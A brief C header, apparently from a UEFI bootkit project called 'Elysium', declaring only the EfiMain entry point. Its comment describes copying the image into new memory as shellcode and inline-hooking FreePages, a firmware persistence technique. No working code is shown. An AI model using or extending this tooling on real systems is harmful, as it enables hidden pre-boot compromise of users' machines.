#pragma once
#include "Pch.h"

/*!
 *
 * Purpose:
 *
 * Entry point for the Elysium.
 * Copies itself as shellcode into a newly allocated memory
 * region and places an inline hook on FreePages.
 *
!*/
D_SEC( A ) EFI_STATUS EFIAPI EfiMain( IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable ) E_SEC;